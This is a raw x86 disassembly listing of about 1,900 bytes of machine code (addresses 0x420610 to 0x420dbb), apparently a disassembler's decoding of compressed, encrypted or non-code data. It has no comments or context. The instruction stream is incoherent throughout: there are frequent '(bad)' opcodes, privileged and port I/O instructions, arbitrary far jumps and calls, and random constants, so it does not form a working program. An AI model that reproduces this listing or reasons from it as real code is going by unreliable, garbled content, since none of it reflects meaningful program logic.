  420610:	sub    al,0x2
  420612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420613:	inc    ecx
  420614:	xor    eax,edi
  420616:	mov    cx,0xe73c
  42061a:	stos   DWORD PTR es:[edi],eax
  42061b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42061c:	fimul  WORD PTR [esi-0x13]
  42061f:	jnp    0x420695
  420621:	ficomp DWORD PTR [ebx]
  420623:	pop    ds
  420624:	in     eax,0x4b
  420626:	sub    DWORD PTR [ebx+edx*1-0x2c],ebx
  42062a:	mov    eax,ds:0x7ce968ec
  42062f:	imul   BYTE PTR [ebx+0x26dff5cb]
  420635:	pushf  
  420636:	arpl   WORD PTR [eax+eiz*1],dx
  420639:	pop    bp
  42063b:	xchg   ebx,eax
  42063c:	ret    
  42063d:	fiadd  DWORD PTR [ebp+0xec00]
  420643:	ins    DWORD PTR es:[edi],dx
  420644:	xor    DWORD PTR [ebx-0x3e],edi
  420647:	stos   DWORD PTR es:[edi],eax
  420648:	popa   
  420649:	push   esi
  42064a:	mov    ah,0x68
  42064c:	fldcw  WORD PTR [ecx-0x6b60d8c5]
  420652:	sysenter 
  420654:	push   eax
  420655:	test   al,0xa1
  420657:	sahf   
  420658:	mov    ah,0x72
  42065a:	fwait
  42065b:	xor    al,0xcc
  42065d:	mov    edx,0x2b1a0000
  420662:	cdq    
  420663:	or     dh,BYTE PTR [edx]
  420665:	dec    ebx
  420666:	jmp    0xc523:0x53ff55ef
  42066d:	cmp    eax,0xa3b38fc
  420672:	xchg   esi,eax
  420673:	shl    BYTE PTR [ecx],cl
  420675:	inc    esi
  420676:	mov    esp,0x554a4e1
  42067b:	adc    esi,edi
  42067d:	cdq    
  42067e:	or     DWORD PTR [esi+0x5f1360ad],edi
  420684:	pop    ecx
  420685:	sar    DWORD PTR [ecx+0x52],0xe9
  420689:	xchg   edi,eax
  42068a:	cdq    
  42068b:	sub    bh,BYTE PTR gs:[ebp-0x3f208b36]
  420692:	fadd   QWORD PTR [eax]
  420694:	add    cl,dl
  420696:	ss test edx,eax
  420699:	sbb    ebp,esi
  42069b:	fwait
  42069c:	je     0x42067f
  42069e:	(bad)  
  42069f:	sub    DWORD PTR [edi-0x311f5eb1],ebp
  4206a5:	push   ecx
  4206a6:	jg     0x420684
  4206a8:	xor    ah,bh
  4206aa:	(bad)  
  4206ab:	sub    DWORD PTR [esi-0x3191e2fd],edx
  4206b1:	adc    al,0x46
  4206b3:	enter  0x15,0x0
  4206b7:	ret    
  4206b8:	or     al,0x3c
  4206ba:	add    BYTE PTR [eax],al
  4206bc:	aam    0xd0
  4206be:	xchg   edi,eax
  4206bf:	mov    BYTE PTR [ebx-0x1d180000],bh
  4206c5:	adc    ah,cl
  4206c7:	jg     0x4206c9
  4206c9:	add    BYTE PTR [edx],ch
  4206cb:	mov    bl,0xb9
  4206cd:	jno    0x420735
  4206cf:	xor    DWORD PTR [ecx+0x2b],edx
  4206d2:	bound  edi,QWORD PTR [edi-0x2d]
  4206d5:	xchg   edi,eax
  4206d6:	repnz sub eax,0x9aa9cda7
  4206dc:	lods   al,BYTE PTR ds:[esi]
  4206dd:	cmp    BYTE PTR [ebp-0x3f],cl
  4206e0:	mov    al,0x4
  4206e2:	xor    eax,0x6c2b0000
  4206e7:	in     eax,0x5c
  4206e9:	jo     0x42070c
  4206eb:	les    ebp,FWORD PTR [eax+eax*1]
  4206ee:	add    bh,dl
  4206f0:	mov    ebx,DWORD PTR [ecx+0xb]
  4206f3:	imul   BYTE PTR [edi-0x53]
  4206f6:	push   ds
  4206f7:	popa   
  4206f8:	cmp    esi,edx
  4206fa:	cs sbb eax,0x295e6bb7
  420700:	les    edi,FWORD PTR [edi+0x0]
  420703:	add    BYTE PTR [edx-0x523fab8b],ch
  420709:	add    BYTE PTR [eax],al
  42070b:	push   eax
  42070c:	ja     0x420762
  42070e:	cmp    al,0xce
  420710:	adc    al,dl
  420712:	xchg   edx,eax
  420713:	mov    dl,0x33
  420715:	inc    esi
  420716:	ja     0x420746
  420718:	mov    al,0x34
  42071a:	sub    al,0xbb
  42071c:	stos   BYTE PTR es:[edi],al
  42071d:	inc    esp
  42071e:	outs   dx,DWORD PTR ds:[esi]
  42071f:	add    BYTE PTR [eax],al
  420721:	dec    edi
  420722:	popa   
  420723:	and    edi,DWORD PTR [edi-0x74e54bc2]
  420729:	sahf   
  42072a:	fiadd  WORD PTR [ecx+0x5ab93d4]
  420730:	js     0x420728
  420732:	mov    eax,0xb79285f5
  420737:	into   
  420738:	out    0x2,eax
  42073a:	xor    BYTE PTR [esi+0x0],0x0
  42073e:	loop   0x420716
  420740:	xor    ebp,DWORD PTR [ebp-0x4e]
  420743:	aaa    
  420744:	cmp    DWORD PTR [edi+0x43],ebx
  420747:	mov    ss,esi
  420749:	lds    ebp,FWORD PTR [edx+0x794879e6]
  42074f:	add    BYTE PTR [eax],al
  420751:	lds    ebx,FWORD PTR [ebp+0x4a]
  420754:	xchg   DWORD PTR [ebx],esp
  420756:	pop    ebp
  420757:	adc    eax,0x15074582
  42075c:	pop    ds
  42075d:	inc    ebp
  42075e:	loope  0x420717
  420760:	dec    edx
  420761:	fistp  WORD PTR [edx-0x28f2dfe2]
  420767:	je     0x4206f5
  420769:	rol    BYTE PTR [eax],cl
  42076b:	add    bl,bl
  42076d:	repz mov ecx,0xe948
  420773:	mov    esi,0x5365fde4
  420778:	dec    eax
  420779:	ret    
  42077a:	add    BYTE PTR [eax],al
  42077c:	stos   BYTE PTR es:[edi],al
  42077d:	dec    esp
  42077e:	fld    QWORD PTR [eax]
  420780:	add    dl,bh
  420782:	hlt    
  420783:	and    eax,0xd6783153
  420788:	in     al,0x4c
  42078a:	test   al,0x0
  42078c:	add    BYTE PTR ds:0xa6808e,ch
  420792:	add    BYTE PTR [ecx-0x40d3587d],bh
  420798:	mov    ebx,0xb74c
  42079d:	popf   
  42079e:	outs   dx,BYTE PTR ds:[esi]
  42079f:	hlt    
  4207a0:	mov    eax,ds:0xe8c7a731
  4207a5:	daa    
  4207a6:	sahf   
  4207a7:	pop    edi
  4207a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207a9:	in     eax,dx
  4207aa:	jbe    0x4207e4
  4207ac:	dec    ecx
  4207ad:	sbb    DWORD PTR [ebp-0x66],ebp
  4207b0:	repnz xchg esp,eax
  4207b2:	xchg   ebx,eax
  4207b3:	lods   al,BYTE PTR ds:[esi]
  4207b4:	add    dl,ah
  4207b6:	cwde   
  4207b7:	adc    ch,BYTE PTR [edx+0x63]
  4207ba:	sub    DWORD PTR [edi+0x7f],ebx
  4207bd:	(bad)  
  4207be:	hlt    
  4207bf:	ret    
  4207c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207c1:	mov    WORD PTR [eax+0x0],fs
  4207c4:	add    BYTE PTR [eax+0x14f32ecd],ch
  4207ca:	out    dx,eax
  4207cb:	jae    0x4207bc
  4207cd:	nop
  4207ce:	add    al,0x62
  4207d0:	add    BYTE PTR [eax],al
  4207d2:	cmp    BYTE PTR [esi-0x76],bl
  4207d5:	icebp  
  4207d6:	push   0x53
  4207d8:	rcr    BYTE PTR [edx-0x260eb13b],cl
  4207de:	jge    0x4207f8
  4207e0:	psllq  mm6,QWORD PTR [ecx-0xfae4942]
  4207e7:	mov    eax,0xc6ed8273
  4207ec:	pop    ss
  4207ed:	retf   
  4207ee:	mov    ah,bl
  4207f0:	add    BYTE PTR [eax],al
  4207f2:	inc    edi
  4207f3:	iret   
  4207f4:	cld    
  4207f5:	inc    eax
  4207f6:	aas    
  4207f7:	add    BYTE PTR [eax],al
  4207f9:	icebp  
  4207fa:	dec    ebp
  4207fb:	push   esp
  4207fc:	fsub   QWORD PTR ds:0x83d5bd7
  420802:	xor    eax,DWORD PTR [eax]
  420804:	add    BYTE PTR [esi+0x6cbab9b6],bl
  42080a:	fwait
  42080b:	jmp    0xe471e737
  420810:	add    DWORD PTR [edx-0x7f9292c7],edx
  420816:	pop    ss
  420817:	add    BYTE PTR [eax],al
  420819:	sbb    DWORD PTR [edx-0x52],eax
  42081c:	lds    eax,FWORD PTR [eax-0x69]
  42081f:	add    BYTE PTR [eax],al
  420821:	sub    al,0xce
  420823:	sub    esi,DWORD PTR [ebx]
  420825:	mov    bh,0xa8
  420827:	daa    
  420828:	sub    BYTE PTR [esi-0x4e],bl
  42082b:	sti    
  42082c:	pusha  
  42082d:	sbb    eax,ecx
  42082f:	sbb    al,BYTE PTR [eax]
  420831:	add    BYTE PTR [edx],dl
  420833:	pop    eax
  420834:	lock cdq 
  420836:	retf   
  420837:	test   ecx,ecx
  420839:	xor    cl,BYTE PTR [edx+0x4140e28d]
  42083f:	add    BYTE PTR [eax],al
  420841:	inc    eax
  420842:	jno    0x420844
  420844:	add    al,dh
  420846:	out    0x3e,al
  420848:	mov    eax,ds:0x2e99d82d
  42084d:	mov    dh,0x89
  42084f:	xor    ch,BYTE PTR [edi+0x59]
  420852:	sahf   
  420853:	repnz call 0xfb9e:0x54105cb8
  42085b:	xchg   ecx,eax
  42085c:	pop    esp
  42085d:	mov    bl,0x0
  42085f:	mov    es,WORD PTR [eax]
  420861:	add    ch,ch
  420863:	and    edi,esp
  420865:	sbb    DWORD PTR [ebx-0x5abb1866],0x82d90000
  42086f:	adc    al,0x22
  420871:	mov    BYTE PTR [edi+0x3be20000],ah
  420877:	pop    eax
  420878:	mov    edx,0x265f77ff
  42087d:	outs   dx,BYTE PTR ds:[esi]
  42087e:	pop    es
  42087f:	arpl   WORD PTR [edx],bx
  420881:	test   DWORD PTR [ebx],edi
  420883:	mov    ah,bl
  420885:	stos   BYTE PTR es:[edi],al
  420886:	xor    BYTE PTR [esi],bh
  420888:	mov    dl,0x9c
  42088a:	ret    0x277b
  42088d:	add    al,BYTE PTR [eax-0x6b]
  420890:	add    BYTE PTR [eax],al
  420892:	mov    ah,0x7
  420894:	inc    ecx
  420895:	into   
  420896:	loop   0x4208a9
  420898:	dec    esp
  420899:	inc    esp
  42089a:	add    BYTE PTR [eax],al
  42089c:	push   edx
  42089e:	cwde   
  42089f:	mov    cl,0x80
  4208a1:	jmp    0x4208a3
  4208a3:	add    BYTE PTR ds:0x7ec66f59,dl
  4208a9:	cmp    BYTE PTR [edi],0x66
  4208ac:	scas   al,BYTE PTR es:[edi]
  4208ad:	aas    
  4208ae:	xor    DWORD PTR [edx+0x27aa4981],0xffffff96
  4208b5:	mov    cl,BYTE PTR [esi-0x24]
  4208b8:	ss ss inc ebx
  4208bb:	or     bh,BYTE PTR [eax+0x34b896d2]
  4208c1:	cli    
  4208c2:	ror    BYTE PTR [esi],cl
  4208c4:	inc    esp
  4208c5:	jae    0x4208c7
  4208c7:	add    BYTE PTR [esp+edx*2+0x15a0000],cl
  4208ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d0:	imul   ecx,DWORD PTR ds:0x20e09cc2,0xffffffdf
  4208d7:	iret   
  4208d8:	mov    edi,0x461d62bd
  4208dd:	out    0xee,al
  4208df:	cmp    ecx,DWORD PTR [ecx-0x69a521c1]
  4208e5:	jecxz  0x4208ae
  4208e7:	mov    al,0x70
  4208e9:	pop    es
  4208ea:	test   eax,0x43682d5e
  4208ef:	mov    bl,0xa1
  4208f1:	mov    al,0xc9
  4208f3:	lods   eax,DWORD PTR ds:[esi]
  4208f4:	fstp   DWORD PTR es:[edi-0x6896384f]
  4208fb:	mov    esi,0x775bc6e2
  420900:	sub    eax,0x6de48af5
  420905:	aad    0xdc
  420907:	je     0x42094b
  420909:	lahf   
  42090a:	push   ebx
  42090b:	mul    DWORD PTR ds:0x6d823a36
  420911:	stc    
  420912:	sti    
  420913:	mov    ebp,0x44f243c3
  420918:	arpl   WORD PTR [eax],ax
  42091a:	add    BYTE PTR [ebx+0x53],cl
  42091d:	adc    al,dh
  42091f:	push   0x3a
  420921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420922:	add    DWORD PTR [esi],esp
  420924:	inc    esi
  420925:	cmp    al,0xcd
  420927:	(bad)  
  420928:	loop   0x42097f
  42092a:	dec    edi
  42092b:	mov    DWORD PTR [ebx-0x39654d27],0x36075c14
  420935:	stc    
  420936:	icebp  
  420937:	and    dh,BYTE PTR [edx]
  420939:	out    dx,eax
  42093a:	mov    esp,DWORD PTR [ecx-0x5e7414d6]
  420940:	mov    cl,0x7a
  420942:	xchg   edi,eax
  420943:	mov    es,WORD PTR [ebp-0x72]
  420946:	dec    edx
  420947:	mov    ecx,0x94549787
  42094c:	jno    0x4209a5
  42094e:	dec    esi
  42094f:	outs   dx,BYTE PTR ds:[esi]
  420950:	or     edi,DWORD PTR [ebx+edx*8-0x6e]
  420954:	push   es
  420955:	fld    TBYTE PTR [ebx+0x23fb6dc6]
  42095b:	and    eax,0xb80b3cf1
  420960:	jnp    0x420937
  420962:	jg     0x4209b8
  420964:	(bad)  
  420965:	in     al,dx
  420966:	add    BYTE PTR [eax],al
  420968:	push   ds
  420969:	sbb    dl,BYTE PTR [esi-0x16b5a714]
  42096f:	data16 stos BYTE PTR es:[edi],al
  420971:	sbb    al,BYTE PTR [ebx-0x72]
  420974:	loope  0x420970
  420976:	adc    al,0x65
  420978:	jle    0x420920
  42097a:	outs   dx,DWORD PTR ds:[esi]
  42097b:	xchg   ecx,eax
  42097c:	xor    al,bh
  42097e:	test   BYTE PTR [ecx-0x6cb80000],ah
  420984:	add    BYTE PTR [eax],al
  420986:	shl    BYTE PTR [esi],1
  420988:	in     al,dx
  420989:	jecxz  0x42092b
  42098b:	or     al,0x54
  42098d:	add    BYTE PTR [eax],al
  42098f:	fbld   TBYTE PTR [eax+ecx*2]
  420992:	sub    al,0x0
  420994:	add    BYTE PTR [ebp+0x8],dh
  420997:	push   edx
  420998:	add    BYTE PTR [eax],al
  42099a:	pop    esp
  42099b:	or     al,bh
  42099d:	add    BYTE PTR [eax],al
  42099f:	ds push ebx
  4209a1:	dec    edi
  4209a2:	mov    edi,0xadc2d7d7
  4209a7:	inc    edx
  4209a8:	adc    ebp,esi
  4209aa:	inc    edi
  4209ab:	mov    bh,0x39
  4209ad:	mov    eax,0xb83b1636
  4209b2:	imul   esp,DWORD PTR [ebx+edi*2],0xf3d6abf9
  4209b9:	scas   al,BYTE PTR es:[edi]
  4209ba:	jmp    ebx
  4209bc:	jne    0x420960
  4209be:	xchg   ebp,eax
  4209bf:	stos   BYTE PTR es:[edi],al
  4209c0:	xor    edi,ebp
  4209c2:	je     0x420a13
  4209c4:	test   eax,0x22ccc7
  4209c9:	add    BYTE PTR [edx+0x65],dl
  4209cc:	cmp    DWORD PTR [esi-0x288f29d2],0x7fc86e
  4209d6:	add    BYTE PTR [esi+0x64],dh
  4209d9:	jmp    0x5d748b20
  4209de:	push   ecx
  4209df:	and    al,0x17
  4209e1:	sub    bh,bh
  4209e3:	in     eax,0x2
  4209e5:	lds    ebx,FWORD PTR [eax]
  4209e7:	test   DWORD PTR [ecx-0xe],ecx
  4209ea:	mov    ch,0x65
  4209ec:	int3   
  4209ed:	dec    esi
  4209ee:	add    BYTE PTR [eax],al
  4209f0:	mov    eax,DWORD PTR [ecx+0x62]
  4209f3:	sub    al,0x8c
  4209f5:	aad    0x0
  4209f7:	add    BYTE PTR [esi+0x22ca2fa2],ah
  4209fd:	mov    bl,0x2f
  4209ff:	adc    BYTE PTR [eax-0x57be0000],0xbe
  420a06:	pop    esp
  420a07:	or     BYTE PTR [ebx],dl
  420a09:	add    BYTE PTR [eax],al
  420a0b:	pop    es
  420a0c:	push   ebp
  420a0d:	push   ebp
  420a0e:	(bad)  
  420a0f:	adc    esp,DWORD PTR [esi]
  420a11:	dec    esp
  420a12:	mov    esp,0xd0bb0000
  420a17:	mov    eax,0xefc245e2
  420a1c:	push   ds
  420a1d:	fisttp QWORD PTR [esi-0x4c]
  420a20:	xor    edx,DWORD PTR [esi+0x44]
  420a23:	pop    ecx
  420a24:	add    BYTE PTR [eax],al
  420a26:	stc    
  420a27:	mov    BYTE PTR [eax+0x0],bh
  420a2a:	add    ah,al
  420a2c:	mov    esi,0x7ad60000
  420a31:	leave  
  420a32:	rol    DWORD PTR [ebx-0x16345826],0x17
  420a39:	push   eax
  420a3a:	push   0xfffffff7
  420a3c:	ud0    ebp,ebp
  420a3f:	sbb    al,0x62
  420a41:	sub    al,0x90
  420a43:	aaa    
  420a44:	and    al,BYTE PTR ds:0xc925e29d
  420a4a:	cmc    
  420a4b:	xchg   ecx,eax
  420a4c:	loop   0x4209ec
  420a4e:	xor    ebp,DWORD PTR [ebp+0x1f8417]
  420a54:	add    bl,dl
  420a56:	clc    
  420a57:	adc    DWORD PTR [ecx-0x2a],0x71d40f2d
  420a5e:	aam    0xc3
  420a60:	and    ch,al
  420a62:	sbb    esp,DWORD PTR [esi+0x3a]
  420a65:	jmp    0x420a4a
  420a67:	mov    ds:0xe9992f56,eax
  420a6c:	xor    ah,0x0
  420a6f:	add    BYTE PTR [edi+ebx*4+0x660c],bl
  420a76:	scas   eax,DWORD PTR es:[di]
  420a78:	pop    es
  420a79:	in     eax,dx
  420a7a:	call   0x85eb5146
  420a7f:	lods   al,BYTE PTR ds:[esi]
  420a80:	aad    0xa6
  420a82:	pusha  
  420a83:	arpl   WORD PTR [ecx-0x66],cx
  420a86:	xor    eax,0x62832cb0
  420a8b:	add    dh,ch
  420a8d:	dec    edx
  420a8e:	pop    ecx
  420a8f:	push   0x95f7b45e
  420a94:	mov    ah,0xfa
  420a96:	dec    edx
  420a97:	pop    esi
  420a98:	jl     0x420ac4
  420a9a:	(bad)  
  420a9b:	mov    dl,0xde
  420a9d:	int    0xe
  420a9f:	cs pop ss
  420aa1:	stc    
  420aa2:	stos   DWORD PTR es:[edi],eax
  420aa3:	push   ebp
  420aa4:	outs   dx,DWORD PTR fs:[esi]
  420aa6:	lock xlat BYTE PTR ds:[ebx]
  420aa8:	lock std 
  420aaa:	fiadd  WORD PTR [eax+ecx*4+0x0]
  420aae:	add    al,dh
  420ab0:	mov    ds:0x1734120b,al
  420ab5:	sbb    al,BYTE PTR [ecx+0x45]
  420ab8:	aad    0x7b
  420aba:	cmp    edi,DWORD PTR [edi+0x7b]
  420abd:	add    dh,al
  420abf:	iret   
  420ac0:	pop    edi
  420ac1:	imul   edx,DWORD PTR [eax-0x5db6b896],0x6f
  420ac8:	out    0xaf,eax
  420aca:	out    0xd7,al
  420acc:	aaa    
  420acd:	mov    esp,0x940c1bcd
  420ad2:	add    BYTE PTR [eax],al
  420ad4:	jo     0x420a7a
  420ad6:	call   0x8de7:0xc712baac
  420add:	mov    WORD PTR [edx],cs
  420adf:	add    BYTE PTR [eax],al
  420ae1:	dec    edi
  420ae2:	or     eax,0x74c422b4
  420ae7:	add    BYTE PTR [eax],al
  420ae9:	fs dec edx
  420aeb:	std    
  420aec:	lahf   
  420aed:	hlt    
  420aee:	jmp    0x420b18
  420af0:	fs pop ds
  420af2:	imul   DWORD PTR [edi-0x70]
  420af5:	push   esp
  420af6:	lods   eax,DWORD PTR ds:[esi]
  420af7:	and    edi,edx
  420af9:	ficomp DWORD PTR [ebx]
  420afb:	add    eax,0x7fb1a8f8
  420b00:	iret   
  420b01:	es dec ebp
  420b03:	mov    dh,0x9c
  420b05:	or     eax,0x7b80
  420b0a:	(bad)  
  420b0b:	fdivr  QWORD PTR [eax]
  420b0d:	jle    0x420afe
  420b0f:	jle    0x420add
  420b11:	dec    edx
  420b12:	add    BYTE PTR [eax],al
  420b14:	jle    0x420b49
  420b16:	rol    dh,1
  420b18:	pop    edx
  420b19:	mov    edi,0xfa031a1e
  420b1e:	jae    0x420b97
  420b20:	xchg   esi,eax
  420b21:	jns    0x420b56
  420b23:	xor    ebx,DWORD PTR [esi+0x183fd33d]
  420b29:	retfw  
  420b2b:	repz sbb dh,ch
  420b2e:	jns    0x420aeb
  420b30:	leave  
  420b31:	mov    ecx,DWORD PTR [edx]
  420b33:	jae    0x420b35
  420b35:	fild   DWORD PTR [eax]
  420b37:	add    bl,ch
  420b39:	mov    ah,0xa1
  420b3b:	sbb    esp,DWORD PTR [ecx-0x65]
  420b3e:	jae    0x420ace
  420b40:	getsec 
  420b42:	mov    ebx,0x9d4f996f
  420b47:	mov    dl,0x9
  420b49:	sub    BYTE PTR [edi-0x39f14df1],ch
  420b4f:	jp     0x420b74
  420b51:	push   ss
  420b52:	mov    ebx,0xc899414e
  420b57:	add    BYTE PTR [bx+si],al
  420b5a:	call   0x77ae:0x9e39f43f
  420b61:	inc    edi
  420b62:	add    dh,BYTE PTR [esi+0x42]
  420b65:	cmp    DWORD PTR [esi-0x14],esi
  420b68:	xchg   edi,eax
  420b69:	mov    WORD PTR [edx+0x76620000],gs
  420b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b70:	or     esi,DWORD PTR [esp+eax*1-0x62ffffbf]
  420b77:	scas   al,BYTE PTR es:[edi]
  420b78:	ins    BYTE PTR es:[edi],dx
  420b79:	loopne 0x420bc7
  420b7b:	mov    cl,0x0
  420b7d:	add    dl,cl
  420b7f:	in     eax,0x96
  420b81:	pmulhuw mm3,mm6
  420b84:	sub    bl,BYTE PTR [ebp-0x27]
  420b87:	adc    ebx,esi
  420b89:	or     ebx,DWORD PTR [esi]
  420b8b:	push   esp
  420b8c:	shl    bh,cl
  420b8e:	fst    st(0)
  420b90:	add    al,BYTE PTR [edi+0xd]
  420b93:	inc    bh
  420b95:	inc    ebp
  420b96:	jp     0x420b7b
  420b98:	pop    eax
  420b99:	dec    eax
  420b9a:	or     eax,DWORD PTR [eax]
  420b9c:	add    BYTE PTR [ebx],cl
  420b9e:	cmp    al,0xa3
  420ba0:	push   ebx
  420ba1:	add    dl,BYTE PTR [edi-0x15c220d3]
  420ba7:	inc    esp
  420ba8:	jg     0x420baa
  420baa:	add    dl,ch
  420bac:	mov    ds:0xce995711,eax
  420bb1:	xor    ebx,edi
  420bb3:	add    al,0x46
  420bb5:	add    BYTE PTR [eax],al
  420bb7:	cmp    eax,0x28e2dcc3
  420bbc:	push   es
  420bbd:	test   BYTE PTR [eax+eax*1+0x0],cl
  420bc1:	ret    0x5493
  420bc4:	out    dx,eax
  420bc5:	lods   eax,DWORD PTR ds:[esi]
  420bc6:	call   0x6d96:0xb286e999
  420bcd:	out    dx,al
  420bce:	jecxz  0x420b8f
  420bd0:	fisttp WORD PTR [edx+0x7fdafba3]
  420bd6:	mov    ebx,0x2ee4d1fc
  420bdb:	inc    cl
  420bdd:	add    DWORD PTR [edx+edx*1-0x4d65c547],edx
  420be4:	ror    bl,0x0
  420be7:	add    BYTE PTR [edi+0x498c],cl
  420bed:	add    DWORD PTR [eax+0x12],esi
  420bf0:	adc    ecx,DWORD PTR [edx]
  420bf2:	(bad)  
  420bf3:	imul   DWORD PTR [edi-0x1b]
  420bf6:	aad    0x35
  420bf8:	call   0x6d4:0x9ab47047
  420bff:	jg     0x420c19
  420c01:	pop    edx
  420c02:	(bad)  
  420c03:	int3   
  420c04:	add    BYTE PTR cs:[eax],al
  420c07:	xor    ebp,ebx
  420c09:	inc    ebp
  420c0a:	loop   0x420bda
  420c0c:	lahf   
  420c0d:	xor    al,0x16
  420c0f:	push   ebx
  420c10:	xchg   edi,eax
  420c11:	push   0xffffffc6
  420c13:	adc    al,0x68
  420c15:	aaa    
  420c16:	jne    0x420bbf
  420c18:	fwait
  420c19:	xchg   edi,eax
  420c1a:	push   ds
  420c1b:	ror    BYTE PTR [edx+0x7980000],0xd1
  420c22:	(bad)  
  420c23:	bound  esp,QWORD PTR [eax+eiz*8-0x3d0c679d]
  420c2a:	pusha  
  420c2b:	inc    ebx
  420c2c:	not    DWORD PTR [eax]
  420c2e:	inc    eax
  420c2f:	xchg   ebx,eax
  420c30:	add    BYTE PTR [eax],al
  420c32:	bound  edi,QWORD PTR [edx+0x24]
  420c35:	out    dx,eax
  420c36:	jbe    0x420bdb
  420c38:	retf   
  420c39:	lock or BYTE PTR [edx],0x76
  420c3d:	sub    DWORD PTR [esi-0x3d],ebp
  420c40:	sub    al,0xf8
  420c42:	and    eax,0x9624560e
  420c47:	fistp  DWORD PTR [ecx-0x3]
  420c4a:	cmc    
  420c4b:	aad    0xb
  420c4d:	xchg   ecx,eax
  420c4e:	sub    ah,BYTE PTR [edi-0x6c]
  420c51:	sub    DWORD PTR ds:0x49812599,esi
  420c57:	dec    edi
  420c58:	jmp    FWORD PTR [ebx-0x1]
  420c5b:	fistp  WORD PTR [esi]
  420c5d:	jb     0x420bf7
  420c5f:	xchg   ebx,eax
  420c60:	adc    ebp,DWORD PTR [ecx-0x1]
  420c63:	nop
  420c64:	pop    ebx
  420c65:	jno    0x420ce6
  420c67:	ret    
  420c68:	push   0x39f1d031
  420c6d:	inc    eax
  420c6e:	add    eax,0x9b6d0000
  420c73:	xor    BYTE PTR [ebx-0x493e4d54],ah
  420c79:	ret    0xacac
  420c7c:	fwait
  420c7d:	jmp    0x1228:0xfd5a667c
  420c84:	add    al,0x51
  420c86:	add    BYTE PTR [eax],al
  420c88:	push   edx
  420c89:	inc    ebx
  420c8a:	and    dl,BYTE PTR [edx]
  420c8c:	pop    esi
  420c8d:	cs add eax,0x29a8cf97
  420c93:	iret   
  420c94:	in     al,0xd8
  420c96:	mov    ecx,0x5ac0136d
  420c9b:	add    BYTE PTR [eax],al
  420c9d:	cmp    ebp,edx
  420c9f:	(bad)  
  420ca1:	mov    eax,ds:0xea0ce4
  420ca6:	add    BYTE PTR [ebp-0x301b0d5b],bl
  420cac:	or     al,0x6b
  420cae:	add    BYTE PTR [eax],al
  420cb0:	loopne 0x420cce
  420cb2:	jnp    0x420cd5
  420cb4:	adc    eax,0x7923286d
  420cb9:	sub    eax,0x4984
  420cbe:	mov    dl,ah
  420cc0:	add    BYTE PTR [eax],al
  420cc2:	aaa    
  420cc3:	std    
  420cc4:	es xchg ecx,eax
  420cc6:	cld    
  420cc7:	or     BYTE PTR [edx+0x0],cl
  420cca:	add    BYTE PTR [edi],cl
  420ccc:	shl    DWORD PTR [edi+0x2f],0xa1
  420cd0:	or     BYTE PTR [ebx],bh
  420cd2:	add    BYTE PTR [eax],al
  420cd4:	(bad)  
  420cd5:	neg    BYTE PTR [esi*8-0x55e29b49]
  420cdc:	sub    ah,0x0
  420cdf:	add    dh,dh
  420ce1:	add    ebp,DWORD PTR [ebx+0x315024de]
  420ce7:	mov    al,0x31
  420ce9:	inc    esi
  420cea:	(bad)  
  420ceb:	pushf  
  420cec:	mov    ds:0x48bb20ea,eax
  420cf1:	out    dx,al
  420cf2:	add    BYTE PTR [eax],al
  420cf4:	pop    es
  420cf5:	cmp    dl,BYTE PTR [eax+0x37]
  420cf8:	fst    DWORD PTR [ecx-0x192b79ab]
  420cfe:	retf   
  420cff:	push   cs
  420d00:	rol    dl,0x0
  420d03:	add    BYTE PTR ds:0xfcad42a9,dl
  420d09:	bound  esi,QWORD PTR ds:0x67f827c6
  420d0f:	or     eax,0xc98cd687
  420d14:	add    BYTE PTR [eax],al
  420d16:	push   esi
  420d17:	sub    bh,BYTE PTR [ebx+0x8684]
  420d1d:	imul   eax,DWORD PTR [ebx],0xffffff8e
  420d20:	mov    BYTE PTR [eax+eax*1-0x771f4600],bl
  420d27:	iret   
  420d28:	add    BYTE PTR [eax],al
  420d2a:	in     eax,0x4a
  420d2c:	(bad)  
  420d2e:	out    dx,al
  420d2f:	rol    ecx,0xf
  420d32:	out    0x96,eax
  420d34:	ins    BYTE PTR es:[edi],dx
  420d35:	push   0xc6443c
  420d3a:	add    BYTE PTR [ebp+edi*8+0x48],bl
  420d3e:	pop    ebx
  420d3f:	add    BYTE PTR [eax],al
  420d41:	mov    ch,0x8b
  420d43:	pop    ecx
  420d44:	fdecstp 
  420d46:	je     0x420cde
  420d48:	or     DWORD PTR [eax+0x53000045],0x30
  420d4f:	lds    sp,DWORD PTR [eax]
  420d52:	repnz mov ebx,0xb8e7ee18
  420d58:	icebp  
  420d59:	xor    BYTE PTR [ebx],ch
  420d5b:	add    al,0x76
  420d5d:	add    BYTE PTR [eax],al
  420d5f:	mov    bh,0xb
  420d61:	xor    edx,DWORD PTR [ebx+eiz*4]
  420d64:	xchg   esi,eax
  420d65:	cli    
  420d66:	push   edi
  420d67:	jne    0x420d45
  420d69:	pop    ds
  420d6a:	xor    DWORD PTR [ebx],edi
  420d6c:	mov    al,0x4e
  420d6e:	or     al,0x51
  420d70:	add    BYTE PTR [eax],al
  420d72:	pop    ebx
  420d73:	jl     0x420dc8
  420d75:	in     eax,dx
  420d76:	ss mov ebx,0x743f9fae
  420d7c:	inc    ebx
  420d7d:	mov    ecx,0xd13324ea
  420d82:	pushf  
  420d83:	in     eax,dx
  420d84:	mov    esp,0xa4fe587d
  420d89:	inc    esi
  420d8a:	jp     0x420d88
  420d8c:	push   esp
  420d8d:	and    dh,BYTE PTR [ecx]
  420d8f:	xchg   edx,eax
  420d90:	push   eax
  420d91:	mov    esi,0xf431dc96
  420d96:	push   cs
  420d97:	loope  0x420e02
  420d99:	lea    eax,[ebp-0x7dad0e6f]
  420d9f:	xor    BYTE PTR [edi+0x67],cl
  420da2:	loopne 0x420dea
  420da4:	mov    WORD PTR [eax+eax*1+0x0],ds
  420da8:	into   
  420da9:	mov    al,0x4d
  420dab:	mov    ah,0xb3
  420dad:	pop    es
  420dae:	xchg   BYTE PTR [edi],bh
  420db0:	push   ebx
  420db1:	not    BYTE PTR [ebx+0x37da118a]
  420db7:	pusha  
  420db8:	mov    bh,0xd0
  420dba:	pop    ebp
  420dbb:	repnz ins DWORD PTR es:[edi],dx
